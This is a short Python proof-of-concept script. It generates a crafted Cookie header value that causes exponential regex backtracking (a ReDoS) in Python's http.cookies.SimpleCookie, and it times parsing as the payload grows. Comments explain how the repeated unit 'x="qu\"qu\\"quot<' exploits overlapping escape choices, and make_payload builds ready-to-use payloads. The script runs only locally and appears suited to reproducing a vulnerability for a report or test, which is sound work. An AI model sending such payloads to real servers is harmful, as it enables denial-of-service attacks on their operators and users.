#!/usr/bin/env python3

import sys
import time

# Trigger unit:  x="qu\"qu\\"quot<   (17 chars, pure ASCII)
#
# The value  "qu\"qu\\"quot<  is an unterminated quoted string.
# Inside it the regex "(?:\\"|.)*?" encounters two overlapping choice points:
#
#   \"   can be consumed by \\"|  (backslash+quote as one escape) or by
#        .  (just the backslash), letting the following " close the string.
#
#   \\"  offers the same choice for the inner \".
#
# Whenever the regex closes early it produces a partial quoted value
# followed by "quot<...", which fails _CookiePattern's trailing
# (\s+|;|$) requirement.  The engine backtracks and tries the next
# possible closing position.  With N repetitions of the unit, the
# number of paths explored grows as O(4^N).

_UNIT = 'x="qu\\"qu\\\\"quot<'   # raw: x="qu\"qu\\"quot<


def make_payload(units: int = 11) -> str:
    """Return a Cookie header value that causes ~4^units backtrack steps."""
    return (" " + _UNIT) * units

def demo_local() -> None:
    import http.cookies

    print("Timing SimpleCookie.load with increasing payload size")
    print(f"  {'units':>5}  {'bytes':>6}  {'time':>10}")
    for n in range(1, 14):
        payload = make_payload(n)
        start = time.perf_counter()
        http.cookies.SimpleCookie().load(payload)
        elapsed = time.perf_counter() - start
        print(f"  {n:>5}  {len(payload):>6}  {elapsed:>10.4f}s")
        if elapsed > 10:
            print("  (stopping)")
            break

demo_local()
